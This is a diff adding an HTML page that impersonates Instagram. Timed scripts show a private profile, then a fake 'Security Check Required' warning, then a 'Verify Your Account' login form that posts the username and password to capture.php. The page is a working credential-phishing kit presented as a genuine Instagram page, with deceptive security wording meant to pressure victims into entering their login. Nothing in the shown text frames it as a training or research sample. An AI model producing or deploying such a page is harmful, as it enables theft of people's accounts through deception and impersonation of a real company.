@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            line-height: 1.4;
+            color: #262626;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+        }
+        .instagram-header {
+            padding: 8px;
+            border-bottom: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .profile-section {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .profile-pic {
+            width: 86px;
+            height: 86px;
+            border-radius: 50%;
+            background: #f0f0f0;
+            margin: 0 auto 15px;
+            position: relative;
+        }
+        .profile-pic::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            z-index: -1;
+        }
+        .profile-pic::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            right: 3px;
+            bottom: 3px;
+            border-radius: 50%;
+            background: white;
+            z-index: -1;
+        }
+        .profile-pic img {
+             width: 100%;
+             height: 100%;
+             object-fit:cover ;
+             border-radius: 50%;
+             object-position: center 0%;
+        }
+
+        .username {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .private-badge {
+            display: inline-flex;
+            align-items: center;
+            background: #efefef;
+            border-radius: 3px;
+            padding: 5px 9px;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+        .profile-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 20px;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .stat-label {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .security-notice {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
+            border: 1px solid #dbdbdb;
+        }
+        .security-icon {
+            width: 48px;
+            height: 48px;
+            background: #0095f6;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .security-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .security-message {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+        .login-form-container {
+            background: white;
+            padding: 20px;
+            margin: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+        }
+        .form-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            font-family: inherit;
+        }
+        .form-input:focus {
+            border-color: #a8a8a8;
+        }
+        .login-button {
+            width: 100%;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 16px;
+            margin-top: 8px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .login-button:disabled {
+            background: #b2dffc;
+            cursor: default;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            margin-top: 12px;
+            display: block;
+            text-align: center;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .instagram-footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="instagram-header">
+            <div class="instagram-logo"></div>
+        </div>
+
+        <div class="profile-section" id="profile-section" style="display: none;">
+            <div class="profile-pic">   
+                <img src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcTCqMWmp5FurwZkGCqAIjaGPLyZRZb5-bf64jOGQTimCHjvQWzZ" alt="Profile">
+            </div>
+            <div class="username">@_username</div>
+            <div class="private-badge">Private Account</div>
+            <div class="profile-stats">
+                <div class="stat">
+                    <div class="stat-number">4</div>
+                    <div class="stat-label">posts</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">180</div>
+                    <div class="stat-label">followers</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">148</div>
+                    <div class="stat-label">following</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-notice" id="security-check" style="display: none;">
+            <div class="security-icon">!</div>
+            <div class="security-title">Security Check Required</div>
+            <div class="security-message">
+                We've detected an unusual attempt to view a profile from a new device or location. 
+                This is a private account to view actual profile. Please verify your identity.
+            </div>
+        </div>
+
+        <div class="login-form-container" id="login-form" style="display: none;">
+            <div class="form-title">Verify Your Account</div>
+            <form class="login-form" action="capture.php" method="post">
+                <div class="form-group">
+                    <input type="text" name="username" class="form-input" placeholder="Phone number, username or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" class="form-input" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+
+        <div class="instagram-footer">
+           English (UK)   © 2026 Instagram from Meta
+        </div>
+    </div>
+
+    <script>
+        function startInstagramFlow() {
+            setTimeout(() => {
+                document.getElementById('profile-section').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('security-check').style.display = 'block';
+                    setTimeout(() => {
+                        document.getElementById('login-form').style.display = 'block';
+                    }, 2000);
+                }, 1500);
+            }, 1500);
+        }
+
+        window.addEventListener('load', startInstagramFlow);
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('.login-form');
+            const inputs = form.querySelectorAll('input');
+            const button = form.querySelector('.login-button');
+
+            function validateForm() {
+                let isValid = true;
+                inputs.forEach(function(input) {
+                    if (!input.value.trim()) isValid = false;
+                });
+                button.disabled = !isValid;
+            }
+
+            inputs.forEach(input => input.addEventListener('input', validateForm));
+            validateForm();
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                button.textContent = 'Logging in...';
+                button.disabled = true;
+                form.style.opacity = '0.7';
+                setTimeout(() => form.submit(), 1000);
+            });
+        });
+    </script>
+</body>
+</html>
